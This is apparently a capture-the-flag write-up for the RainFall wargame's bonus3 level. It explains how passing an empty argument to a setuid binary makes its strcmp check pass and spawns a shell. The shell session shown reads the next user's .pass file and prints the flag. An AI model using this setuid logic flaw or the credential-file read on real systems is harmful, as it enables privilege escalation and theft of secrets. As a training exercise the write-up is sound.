# ------------------------------------------------------------------------
# analysis
# ------------------------------------------------------------------------

the program reads the .pass file for next level into buffer B,
argv[1] is required otherwise it exits
then the program calls `atoi()' with argv[1] as a parameter and the resulting int is used as an index for buffer B,
at that index the program inserts a null byte

afterwards the program compares buffer B to argv[1] string via `strcmp()' and if they match it executes `/bin/sh'

seems like the only way to pass this level is to provide the program with a null byte (empty string) as an argv[1] parameter;
when we do that `atoi()' returns 0, so the first byte of buffer B becomes a null byte,

since our argv[1] string also has a null first byte, `strcmp()' evaluates both strings as equal (they're both empty)
and the program launches a shell:

# ------------------------------------------------------------------------
# getting the flag
# ------------------------------------------------------------------------

    bonus3@RainFall:~$ ./bonus3 ''
    $ whoami
    end
    $ 
    bonus3@RainFall:~$ ./bonus3 ""
    $ whoami
    end
    $ 
    bonus3@RainFall:~$ ./bonus3 $'\0'
    $ whoami
    end
    $ cat /home/user/end/.pass
    3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
    $

# ------------------------------------------------------------------------
# recreating the original program
# ------------------------------------------------------------------------

# As user end:

    # Compile the program in /tmp
    gcc bonus3.c -o ft_bonus3

    # Edit suid
    chmod u+s ft_bonus3

    # Move the program to home directory
    chmod +wx ~; mv ft_bonus3 ~

# As user bonus3:

    # Run the program
    /home/user/end/ft_bonus3 ''


